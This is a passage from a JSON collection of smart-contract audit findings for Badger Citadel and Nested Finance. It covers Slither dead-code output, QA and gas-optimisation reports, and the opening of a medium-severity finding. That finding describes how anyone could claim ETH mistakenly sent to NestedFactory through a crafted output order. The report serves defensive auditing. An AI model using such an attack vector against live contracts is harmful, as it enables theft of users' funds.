(lib/openzeppelin-contracts-upgradeable/contracts/utils/ContextUpgradeable.sol#18-20) is never used and should be removed                                                                                                                                                         \nContextUpgradeable._msgData() (lib/openzeppelin-contracts-upgradeable/contracts/utils/ContextUpgradeable.sol#28-30) is never used and should be removed    \nERC20Upgradeable.__ERC20_init(string,string) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#55-58) is never used and should be removed                                                                                                                                            \nERC20Upgradeable.__ERC20_init_unchained(string,string) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#60-63) is never used and should be removed                                                                                                                                  \nERC20Upgradeable._burn(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#281-296) is never used and should be removed                                                                                                                                               \nERC20Upgradeable._mint(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#258-268) is never used and should be removed                                                                                                                                               \nSafeERC20Upgradeable.safeApprove(IERC20Upgradeable,address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol#45-58) is never used and should be removed                                                                                                           \nSafeERC20Upgradeable.safeDecreaseAllowance(IERC20Upgradeable,address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol#69-80) is never used and should be removed                                                                                                 \nSafeERC20Upgradeable.safeIncreaseAllowance(IERC20Upgradeable,address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol#60-67) is never used and should be removed                                                                                                 \nReference: https://github.com/crytic/slither/wiki/Detector-Documentation#dead-code               \nPausableUpgradeable.__gap (lib/openzeppelin-contracts-upgradeable/contracts/security/PausableUpgradeable.sol#97) is never used in TokenSaleUpgradeable (contracts/TokenSaleUpgradeable.sol#15-384)                                                                                                                    \nERC20Upgradeable.__gap (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#362) is never used in ERC20Upgradeable (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#36-363)                                                                           \nReference: https://github.com/crytic/slither/wiki/Detector-Documentation#unused-state-variable   \n```\n\n## Tools Used\n\nSlither\n\n## Recommended Mitigation Steps\n\nRemove unused state variables.",
    "dataSource": {
      "name": "code-423n4/2022-02-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-02-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-02-badger-citadel-findings/issues/49"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report  \n**Table of Contents:**  \n- [QA Report](#qa-report)\n  - [Foreword](#foreword)\n  - [Comparisons](#comparisons)\n    - [Comparison that should be inclusive in NestedRecords.sol](#comparison-that-should-be-inclusive-in-nestedrecordssol)\n  - [Variables](#variables)\n    - [Missing Address(0) checks](#missing-address0-checks)\n    - [Check if a value is in an array before a push](#check-if-a-value-is-in-an-array-before-a-push)\n    - [Variables that should be grouped together in a struct](#variables-that-should-be-grouped-together-in-a-struct)\n      - [File: FeeSplitter.sol](#file-feesplittersol)\n  - [Arithmetics](#arithmetics)\n    - [Possible division by 0](#possible-division-by-0)\n  - [Revert Strings](#revert-strings)\n    - [File: NestedFactory.sol](#file-nestedfactorysol)\n      - [Inconsistent Revert string](#inconsistent-revert-string)\n    - [File: MixinOperatorResolver.sol](#file-mixinoperatorresolversol)\n      - [Inconsistent Revert string (1)](#inconsistent-revert-string-1)\n      - [Misleading + Inconsistent Revert string (2)](#misleading--inconsistent-revert-string-2)\n    - [File: OwnableProxyDelegation.sol](#file-ownableproxydelegationsol)\n      - [Inconsistent Revert string (1)](#inconsistent-revert-string-1-1)\n      - [Inconsistent Revert string (2)](#inconsistent-revert-string-2)\n    - [File: ZeroExOperator.sol](#file-zeroexoperatorsol)\n      - [Inconsistent Revert string (1)](#inconsistent-revert-string-1-2)\n      - [Inconsistent Revert string (2)](#inconsistent-revert-string-2-1)\n  - [Comments](#comments)\n    - [File: NestedFactory.sol](#file-nestedfactorysol-1)\n      - [Missing comment \"@return\" (1)](#missing-comment-return-1)\n      - [Missing comment \"@return\" (2)](#missing-comment-return-2)\n      - [Missing comment \"@param\" (1)](#missing-comment-param-1)\n    - [File: NestedRecords.sol](#file-nestedrecordssol)\n      - [Missing comment \"@return\" (1)](#missing-comment-return-1-1)\n      - [Missing comment \"@return\" (2)](#missing-comment-return-2-1)\n      - [Misleading comment on \"@return\"](#misleading-comment-on-return)\n    - [File: MixinOperatorResolver.sol](#file-mixinoperatorresolversol-1)\n      - [Missing 2 comments \"@param\" & changeable \"@return\" comment/variable](#missing-2-comments-param--changeable-return-commentvariable)\n    - [File: ExchangeHelpers.sol](#file-exchangehelperssol)\n      - [Missing comment \"@return\"](#missing-comment-return)\n\n## Foreword\n- **`@audit` tags**\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Comparisons\n### Comparison that should be inclusive in NestedRecords.sol\n```\nFile: NestedRecords.sol\n123:         require(records[_nftId].tokens.length < maxHoldingsCount, \"NRC: TOO_MANY_TOKENS\"); //@audit should be inclusive\n```\n\nAs length isn't 0 indexed, I believe, as an example to illustrate, that if `maxHoldingsCount == 1`, then `records[_nftId].tokens.length == 1` should be a passing condition. Therefore, I suggest changing `<` with `<=`\n\n## Variables  \n### Missing Address(0) checks  \n```\nFile: MixinOperatorResolver.sol\n22:     constructor(address _resolver) {\n23:         resolver = OperatorResolver(_resolver); //@audit missing address(0) check on immutable just like in the constructors in FeeSplitter.sol and NestedFactory.sol\n24:     }\n```\n\n### Check if a value is in an array before a push\nIn `NestedRecords.sol`'s `store` function, it's possible to push an existing `address _token` several times in the same array \n```\nFile: NestedRecords.sol\n130:         records[_nftId].tokens.push(_token); //@audit : should check existence\n```\nThe previous lines of codes don't prevent this.\nThe `store` function has the modifier `onlyFactory` and the only impact seem to be a possible maximization of `records[_nftId].tokens.length` (so that it reaches `maxHoldingsCount`).\n\n### Variables that should be grouped together in a struct  \nFor maps that use the same key value: having separate fields is error prone (like in case of deletion or future new fields).  \nBy regrouping, it's then possible to delete all related fields with a simple `delete newStruct[previousSameKeyForAllPreviousMaps]`.\n  \n#### File: FeeSplitter.sol\n2 maps can be grouped together, as they use the same `_account` key:  \n```  \n62:     struct TokenRecords {\n63:         uint256 totalShares;\n64:         uint256 totalReleased;\n65:         mapping(address => uint256) shares; //@audit group \n66:         mapping(address => uint256) released; //@audit group \n67:     }\n```  \nI'd suggest these 2 related data get grouped in a struct, let's name it `AccountInfo`:   \n```  \nstruct AccountInfo {   \n    uint256 shares;   \n    uint256 released;   \n}   \n```  \nAnd it would be used in this manner (where `address` is `_account`):   \n```   \n    struct TokenRecords {\n        uint256 totalShares;\n        uint256 totalReleased;\n        mapping(address => AccountInfo) accountInfo;\n    }   \n```   \n## Arithmetics  \n### Possible division by 0  \nThere are no checks that the denominator is `!= 0` here:  \n```  \nFile: FeeSplitter.sol\n327:     function _computeShareCount(\n328:         uint256 _amount,\n329:         uint256 _weight,\n330:         uint256 _totalWeights\n331:     ) private pure returns (uint256) {\n332:         return (_amount * _weight) / _totalWeights; // @audit _totalWeights can be equal to 0, see FeeSplitter.sol:L184\n333:     }\n```\n\n## Revert Strings\n### File: NestedFactory.sol\n#### Inconsistent Revert string\n```\n44:         require(_exists(_tokenId), \"URI query for nonexistent token\");\n```\nAll other revert strings in `NestedAsset.sol` begin with `NA: `. Only this one doesn't. It's possible to gain consistency and still have an < 32 bytes size string with the following: `\"NA: URI query - inexistent token\"`\n\n### File: MixinOperatorResolver.sol\n#### Inconsistent Revert string (1)\n```\n100:             require(tokens[0] == _outputToken, \"OH: INVALID_OUTPUT_TOKEN\");//@audit LOW comment : MOR like above\n```\nHere, `\"OH: INVALID_OUTPUT_TOKEN\"` should be replaced with `\"MOR: INVALID_OUTPUT_TOKEN\"`\n\n#### Misleading + Inconsistent Revert string (2)\n```\n101:             require(tokens[1] == _inputToken, \"OH: INVALID_OUTPUT_TOKEN\"); //@audit LOW comment : INVALID_INPUT_TOKEN //@audit LOW comment : MOR\n```\nHere, `\"OH: INVALID_OUTPUT_TOKEN\"` should be replaced with `\"MOR: INVALID_INPUT_TOKEN\"`\n\n### File: OwnableProxyDelegation.sol\n#### Inconsistent Revert string (1)\n```\n25:         require(!initialized, \"OFP: INITIALIZED\"); //@audit low OFP doesn't make sense, use OPD instead (example: OwnableFactoryHandler is OFH, MixinOperatorResolver is MOR)\n```\nIs most contracts, the capital letters from the contract's name are used as a prefix in the revert strings (`OwnableFactoryHandler` has `OFH`, `MixinOperatorResolver` has `MOR`). Here, `OFP` doesn't really reflect `OwnableProxyDelegation`. It should be `OPD`.\n\n#### Inconsistent Revert string (2)\n```\n26:         require(StorageSlot.getAddressSlot(_ADMIN_SLOT).value == msg.sender, \"OFP: FORBIDDEN\");//@audit should be \"OPD: FORBIDDEN\" \n```\nSame as above: `OFP` should be `OPD`.\n\n### File: ZeroExOperator.sol\n#### Inconsistent Revert string (1)\n```\n32:         require(success, \"ZEO: SWAP_FAILED\");\n...\n36:         require(amountBought != 0, \"ZeroExOperator::performSwap: amountBought cant be zero\"); //@audit LOW do like line 32 : \"ZEO: amountBought cant be zero\" < 32 bytes & consistent\n```\nAs said before, the capital letters from the contract's name are used as a prefix in the revert strings. Here, the revert string's size is > 32 bytes and isn't using the same style as 4 lines above it. `ZeroExOperator::performSwap` should be `ZEO`.\n\n#### Inconsistent Revert string (2)\n```\n32:         require(success, \"ZEO: SWAP_FAILED\");\n...\n37:         require(amountSold != 0, \"ZeroExOperator::performSwap: amountSold cant be zero\");//@audit do like line 32 : \"ZEO: amountSold cant be zero\" < 32 bytes & consistent\n```\nSame as above: `ZeroExOperator::performSwap` should be `ZEO`.\n\n## Comments\n### File: NestedFactory.sol\n#### Missing comment \"@return\" (1)\n```\n403:     /// @dev Call the operator to submit the order and add the output\n404:     /// assets to the reserve (if needed).\n405:     /// @param _inputToken Token used to make the orders\n406:     /// @param _outputToken Expected output token\n407:     /// @param _nftId The nftId\n408:     /// @param _order The order calldata\n409:     /// @param _toReserve True if the output is store in the reserve/records, false if not. //@audit missing @return \n410:     function _submitOrder(\n411:         address _inputToken,\n412:         address _outputToken,\n413:         uint256 _nftId,\n414:         Order calldata _order,\n415:         bool _toReserve\n416:     ) private returns (uint256 amountSpent) {\n```\n\n#### Missing comment \"@return\" (2)\n```\n474:     /// @dev Choose between ERC20 (safeTransfer) and ETH (deposit), to transfer from the Reserve\n475:     ///      or the user wallet, to the factory.\n476:     /// @param _nftId The NFT id\n477:     /// @param _inputToken The token to receive\n478:     /// @param _inputTokenAmount Amount to transfer\n479:     /// @param _fromReserve True to transfer from the reserve\n480:     /// @return Token transfered (in case of ETH)\n481:     ///         The real amount received after the transfer to the factory //@audit missing @return (not the description, just the keyword)\n482:     function _transferInputTokens(\n483:         uint256 _nftId,\n484:         IERC20 _inputToken,\n485:         uint256 _inputTokenAmount,\n486:         bool _fromReserve\n487:     ) private returns (IERC20, uint256) {\n```\n\n#### Missing comment \"@param\" (1)\n```\n562:     /// @dev Transfer from factory and collect fees\n563:     /// @param _token The token to transfer\n564:     /// @param _amount The amount (with fees) to transfer\n565:     /// @param _dest The address receiving the funds //@audit missing @param\n566:     function _safeTransferWithFees(\n567:         IERC20 _token,\n568:         uint256 _amount,\n569:         address _dest,\n570:         uint256 _nftId\n571:     ) private {\n```\n\n### File: NestedRecords.sol\n#### Missing comment \"@return\" (1)\n```\n162:     /// @param _nftId The id of the NFT> //@audit missing @return\n163:     function getAssetTokens(uint256 _nftId) public view returns (address[] memory) {\n```\n\n#### Missing comment \"@return\" (2)\n```\n183:     /// @param _token The address of the token //@audit missing @return\n184:     function getAssetHolding(uint256 _nftId, address _token) public view returns (uint256) {\n```\n\n#### Misleading comment on \"@return\"\nHere, the comment `@return The holdings`, which is the unique `@return` comment, suggests a returned `mapping(address => uint256) holdings` as seen on `struct NftRecord`. However, the function is actually returning a `uint256[]` and an `address[]`. Therefore, two `@return` are required and the previous one should be deleted.\n\nCode:\n```\n188:     /// @notice Returns the holdings associated to a NestedAsset\n189:     /// @param _nftId the id of the NestedAsset\n190:     /// @return The holdings //@audit \"The holdings\" suggests a \"mapping(address => uint256)\" but a uint256[] and an address[] are returned.  \n191:     function tokenHoldings(uint256 _nftId) public view returns (address[] memory, uint256[] memory) {\n```\n\n### File: MixinOperatorResolver.sol\n#### Missing 2 comments \"@param\" & changeable \"@return\" comment/variable\n```\n    /// @dev Build the calldata (with safe datas) and call the Operator\n    /// @param _order The order to execute //@audit missing @param _inputToken and @param _outputToken\n    /// @return success If the operator call is successful\n    /// @return amounts The amounts from the execution (used and received) //@audit why not use uint256[2]?\n    ///         - amounts[0] : The amount of output token\n    ///         - amounts[1] : The amount of input token USED by the operator (can be different than expected)\n    function callOperator(\n        INestedFactory.Order calldata _order,\n        address _inputToken,\n        address _outputToken\n    ) internal returns (bool success, uint256[] memory amounts) {\n```\nI suggest changing the returned uint256[] to uint256[2]\n\n### File: ExchangeHelpers.sol\n#### Missing comment \"@return\"\n```\n10:     /// @dev Perform a swap between two tokens\n11:     /// @param _sellToken Token to exchange\n12:     /// @param _swapTarget The address of the contract that swaps tokens\n13:     /// @param _swapCallData Call data provided by 0x to fill the quote //@audit missing @return\n14:     function fillQuote(\n15:         IERC20 _sellToken,\n16:         address _swapTarget,\n17:         bytes memory _swapCallData\n18:     ) internal returns (bool) {\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/70"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "* function transfer in NestedReserve is never used and can only be called by the factory (onlyFactory), so consider removing it because I think the factory uses a withdraw function from the Reserve.\n\n* Currently never used:\n```solidity\n  function setReserve onlyFactory\n```\nYou can remove it to save some gas, or leave it if it was intended for future use with other factories.\n\n* functions that add or remove operators or shareholders iterate over the whole array, so you can consider using EnumerableSet to store them:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol\n\n* Could just use msg.sender and do not call an owner() function here:\n```solidity\n    function unlockTokens(IERC20 _token) external override onlyOwner {\n        ...\n        _token.safeTransfer(owner(), amount);\n```\n\n* There are several functions that call _checkMsgValue. This function is quite expensive as it iterates over all the _batchedOrders and is only relevant when the inputToken is ETH. Later the callers will have to iterate over all the _batchedOrders again anyway, so I think this function should be refactored to significantly reduce gas. My suggestion:\nbecause processInputOrders and processInputAndOutputOrders both call _processInputOrders, the logic from _checkMsgValue could be moved to _processInputOrders. function create then can be refactored to re-use _processInputOrders. I see 2 discrepancies here: _fromReserve is always false when _submitInOrders is called from create (could be solved if _processInputOrders takes extra parameter), and _processInputOrders has this extra line:\n```solidity\n  require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\");\n```\nbut this could be solved if you first mint the NFT and then invoke _processInputOrders from create.\n\n* function withdraw calls nestedRecords twice:\n```solidity\n uint256 assetTokensLength = nestedRecords.getAssetTokensLength(_nftId);\n ...\n  address token = nestedRecords.getAssetTokens(_nftId)[_tokenIndex];\n ```\n I think it could just substitute these links by first fetching all the tokens, and then calculating the length itself instead of making 2 external calls for pretty much the same data.\n \n * Could use 'unchecked' maths here, as underflow is not possible:\n```solidity\n   if (_amountToSpend > amounts[1]) {\n      IERC20(_inputToken).safeTransfer(_msgSender(), _amountToSpend - amounts[1]);\n    }\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/67"
    }
  },
  {
    "title": "QA Report",
    "body": "* Function releaseTokens uses weth, not eth when comparing against a native asset. if the token address is weth, it unwraps and sends the native asset to the user:\n```solidity\n  if (address(_tokens[i]) == weth)\n    IWETH(weth).withdraw(amount);\n    (bool success, ) = _msgSender().call{ value: amount }(\"\");\n    require(success, \"FS: ETH_TRANFER_ERROR\");\n```\nReleasing weth token should be left as a valid option if the user prefers wrapped ERC20 eth, and I think for this native purpose there is a not used storage variable named ETH:\n```solidity\n  address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n```\nBased on my assumptions, the intention was:\n```solidity\n  if (address(_tokens[i]) == ETH)\n    ...\n```\nor if you do not want to implement this change, then at least remove this unused variable to save some gas.\nHowever, the issue is small, because the user can always retrieve weth by using another function named releaseTokensNoETH.\n\n* This was mentioned in the Red4Sec audit (NFSC09), but it wasn't fixed here: OwnableProxyDelegation is Context, but still uses msg.sender, not _msgSender():\n```solidity\n  require(StorageSlot.getAddressSlot(_ADMIN_SLOT).value == msg.sender, \"OFP: FORBIDDEN\");\n```\n\n* function rebuildCache() in MixinOperatorResolver does not delete removed operators from operatorCache. resolverOperatorsRequired return current active operators, so it will not contain removed operators, e.g. operator was removed by calling removeOperator in the factory, then rebuildCache is called, and the cache will still contain this removed operator, and it will be possible to callOperator on this operator.\n\n* Consider introducing an upper limit for _timestamp in updateLockTimestamp, e.g. max 1 year from current block timestamp, otherwise it may be possible to accidentally lock the token forever.\n\n* if removeFactory has this check:\n```solidity\n  require(supportedFactories[_factory], \"OFH: NOT_SUPPORTED\"); \n```\nthen I think addFactory should have an analogous check:\n```solidity\n  require(!supportedFactories[_factory], \"OFH: ALREADY_SUPPORTED\"); \n```\n* The revert message is a bit missleading here:\n```solidity\n  require(assetTokensLength > 1, \"NF: UNALLOWED_EMPTY_PORTFOLIO\");\n```\n\n* NestedFactory has a function unlockTokens that lets admin rescue any ERC20 token. Consider also adding support for rescuing the native asset (e.g. ETH).",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/66"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "##NestedFinanceGasFindings\n1--\n-using multiple require() is gas saving\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L54-L62\ninstead of using `&&`, using multiple require is gas saving.\n```\nrequire(address(_nestedAsset) != address(0));\nrequire(address(_nestedRecords) != address(0));\n...\n```\n2--\n-better `for()` implementation\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L113\nreplace i++ to ++i and dont set the `i` value because the default is already 0. Its cost less gas usage\n```\nfor (uint256 i; i < operatorsLength; ++i)\n```\n3--\n-Better way of using `SafeERC20` lib \nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L19\nBy calling `SafeERC20.function` directly and removing line 19 can save 15 gas per call:\n```\nSafeERC20.safeTransfer(_token, owner(), amount);\n```\n`SafeErc20.function` was called 8 times in this contract. Also very good to implemented at `NestedReserve.sol`\n4--\n-using storage instead of caching struct/array data can save gas\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L205\nusing `storage` can save gas\n```\naddress[] storage tokens = nestedRecords.getAssetTokens(_nftId);\n```\n`tokens` is called once at `destroy()` before it chaced to `tokensLength` as `tokens.lenght` so reading from storage is cheaper than using memory\n5--\n-use calldata to store `_weights` & `_account`\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L89-L90\nchange memory to calldata\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/64"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. considered using require instead of && can save gas\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L123\n// gas cost 35473\n\nChange to:\n```\nrequire(accountsLength != 0);\nrequire (accountsLength == _weights.length, \"FS: INPUTS_LENGTH_MUST_MATCH\");\n```\n// gas cost 35465\n\n========================================================================\n\n2. considered add unchecked can save gas\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L327\n// gas cost 22798\n\nadd unchecked\n```\nunchecked {\nreturn (_amount * _weight) / _totalWeights;\n}\n```\n// gas cost 22440\n\n========================================================================\n\n3. avoid unnecessary `i = 0` because the default of uint is already 0\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L126\n\nconsidered removing 0 value can save gas\n\n========================================================================\n\n4. `SafeERC20` Gas Optimization\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L19\nby not declaring this\n```\nusing SafeERC20 for IERC20;\n```\n\nand for example, use this:\n```\nSafeERC20.safeTransfer(IERC20(_inputToken)_msgSender(), _amountToSpend - amounts[1]);\n```\n\n========================================================================\n\n5. just read it directly to storage can save gas \nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L279\n// gas cost 24794\n\nChange to:\n```\nShareholder[] storage shareholdersCache = shareholders;\n```\n// gas cost 24684\n\n========================================================================\n\n6. the original function will return 0 which a default value for uint256\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L216 \n// gas cost 24940\n\nChange to:\n```\n     function getAmountDue(address _account, IERC20 _token) public view returns (uint256) {\n        TokenRecords storage _tokenRecords = tokenRecords[address(_token)];\n        if (_tokenRecords.totalShares != 0) {\n\n        uint256 totalReceived = _tokenRecords.totalReleased + _token.balanceOf(address(this));\n        return\n            (totalReceived * _tokenRecords.shares[_account]) /\n            _tokenRecords.totalShares -\n            _tokenRecords.released[_account];\n        }\n    }\n```\n// gas cost 24919\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/55"
    }
  },
  {
    "title": "QA Report",
    "body": "## [N1] Unused imports\n\nThe following source units are imported but not referenced in the contract:\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/operators/Flat/FlatOperator.sol#L4-L4\n\n```solidity\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/operators/Flat/IFlatOperator.sol#L4-L4\n\n```solidity\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n### Recommendation\n\nCheck all imports and remove all unused/unreferenced and unnecessary imports.\n\n\n## [N2] Using `public` to generate the getter function can make the code simpler and cleaner\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/operators/ZeroEx/ZeroExStorage.sol#L7-L19\n\n```solidity\ncontract ZeroExStorage is Ownable {\n    address private _swapTarget;\n\n    /// @notice Returns the address of 0x swaptarget\n    function swapTarget() external view returns (address) {\n        return _swapTarget;\n    }\n\n    /// @notice Update the address of 0x swaptarget\n    function updatesSwapTarget(address swapTargetValue) external onlyOwner {\n        _swapTarget = swapTargetValue;\n    }\n}\n```\n\nCan be changed to:\n\n```solidity\ncontract ZeroExStorage is Ownable {\n    address public swapTarget;\n\n    /// @notice Update the address of 0x swaptarget\n    function updatesSwapTarget(address swapTargetValue) external onlyOwner {\n        swapTarget = swapTargetValue;\n    }\n}\n```\n\n## [N3] Inconsistent use of `_msgSender()`\n\nDirect use of `msg.sender` vs internal call of `_msgSender()`.\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/operators/ZeroEx/ZeroExOperator.sol#L17-L17\n\n```solidity\nZeroExStorage(operatorStorage).transferOwnership(msg.sender);\n```\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/NestedReserve.sol#L30-L30\n\n```solidity\n_token.safeTransfer(msg.sender, _amount);\n```\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/abstracts/OwnableFactoryHandler.sol#L21-L21\n\n```solidity\nrequire(supportedFactories[msg.sender], \"OFH: FORBIDDEN\");\n```\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/FeeSplitter.sol#L103-L103\n\n```solidity\nrequire(msg.sender == weth, \"FS: ETH_SENDER_NOT_WETH\");\n```\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/FeeSplitter.sol#L166-L168\n\n```solidity\namount = _releaseToken(_msgSender(), _tokens[i]);\n_tokens[i].safeTransfer(_msgSender(), amount);\nemit PaymentReleased(_msgSender(), address(_tokens[i]), amount);\n```\n\nhttps://github.com/code-423n4/2022-02-nested/blob/879bae87b1987d6810f25c1082e5bf664390ae7f/contracts/FeeSplitter.sol#L199-L199\n\n```solidity\n_token.safeTransferFrom(_msgSender(), address(this), _amount);\n```\n\n### Recommendation\n\nConsider replacing `_msgSender()` with `msg.sender` for consistency.",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/52"
    }
  },
  {
    "title": "QA Report",
    "body": "## [L1] Check against same-token `swap`:\n\nAssessed risk: 2/10\n\nUrgency: N/A\n\nCodebase frequency: 1\n\n### [L1 - Impact]:\n\nUsers would typically not swap against the same token, hence, developers must put in place a check against such swaps. Because of the rapid development and innovation that happens within the ETH smart contract ecosystem, one should never assume that what does not go wrong now will not go wrong in a few months, hence no exceptions are to be made when it comes to security and best practices.\n\n```bash\nfunction performSwap(\n  IERC20 sellToken,\n  IERC20 buyToken,\n  bytes calldata swapCallData\n) external payable override returns (uint256[] memory amounts, address[] memory tokens) {\n    amounts = new uint256[](2);\n    tokens = new address[](2);\n    uint256 buyBalanceBeforePurchase = buyToken.balanceOf(address(this));\n    uint256 sellBalanceBeforePurchase = sellToken.balanceOf(address(this));\n\t\t...\n```\n\n### [L1 - References]:\n\n```solidity\noperators/ZeroEx/ZeroExOperator.sol line 21\n```\n\n### [L1 - Mitigation]:\n\nAdding a require statement would prevent such a swap.\n\n```bash\nrequire(buyToken != sellToken, \"ERR: same token swap\");\n```\n\n### [L2] Add `_weight != 0` check in FeeSplitter\n\nAssessed risk: 2/10\n\nUrgency: N/A\n\nCodebase frequency: 1\n\n### [L2 - Impact]:\n\nKeeping a consistent check among all functions of the contract that deal with `_weight` is important, both from the security and clean code philosophies. One of the functions implemented in `FeeSplitter.sol` does not check against the latest `_weight` to be different than `0`, contrary to all the similar functions that have this check.\n\n```bash\nfunction updateShareholder(uint256 _accountIndex, uint96 _weight) external onlyOwner {\n    require(_accountIndex < shareholders.length, \"FS: INVALID_ACCOUNT_INDEX\");\n    totalWeights = totalWeights + _weight - shareholders[_accountIndex].weight;\n    require(totalWeights != 0, \"FS: TOTAL_WEIGHTS_ZERO\");\n    shareholders[_accountIndex].weight = _weight;\n    emit ShareholderUpdated(shareholders[_accountIndex].account, _weight);\n}\n```\n\n### [L2 - References]:\n\n```solidity\nFeeSplitter.sol line 134\n```\n\n### [L2 - Mitigation]:\n\nAdd a check against the `_weight` being 0.\n\n```bash\nrequire(_weight != 0, \"FS: ZERO_WEIGHT\");\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/45"
    }
  },
  {
    "title": "NestedFactory: User can utilise accidentally sent ETH funds via processOutputOrders() / processInputAndOutputOrders()",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L71\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L286-L296\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L370-L375\nhttps://github.com/code-423n4/2022-02-nested/blob/main/contracts/NestedFactory.sol#L482-L492\n\n\n# Vulnerability details\n\n## Impact\n\nShould a user accidentally send ETH to the `NestedFactory`, anyone can utilise it to their own benefit by calling `processOutputOrders()` / `processInputAndOutputOrders()`. This is possible because:\n\n1. `receive()` has no restriction on the sender\n2. `processOutputOrders()` does not check `msg.value`, and rightly so, because funds are expected to come from `reserve`.\n3. `transferInputTokens()` does not handle the case where `ETH` could be specified as an address by the user for an output order.\n\n```jsx\nif (address(_inputToken) == ETH) {\n  require(address(this).balance >= _inputTokenAmount, \"NF: INVALID_AMOUNT_IN\");\n  weth.deposit{ value: _inputTokenAmount }();\n  return (IERC20(address(weth)), _inputTokenAmount);\n}\n```\n\nHence, the attack vector is simple. Should a user accidentally send ETH to the contract, create an output `Order` with `token` being `ETH` and amount corresponding to the NestedFactory’s ETH balance.\n\n## Recommended Mitigation Steps\n\n1. Since plain / direct`ETH` transfers are only expected to solely come from `weth` (excluding payable functions), we recommend restricting the sender to be `weth`, like how it is done in `[FeeSplitter](https://github.com/code-423n4/2022-02-nested/blob/main/contracts/FeeSplitter.sol#L101-L104)`.\n    \n    We are aware that this was raised previously here: https://github.com/code-423n4/2021-11-nested-findings/issues/188 and would like to add that the restricting the sender in the `receive()` function will not affect `payable` functions. From from what we see, plain ETH transfers are also not expected to come from other sources like `NestedReserve` or operators.\n    \n\n```jsx\nreceive() external payable {\n  require(msg.sender == address(weth), \"NF: 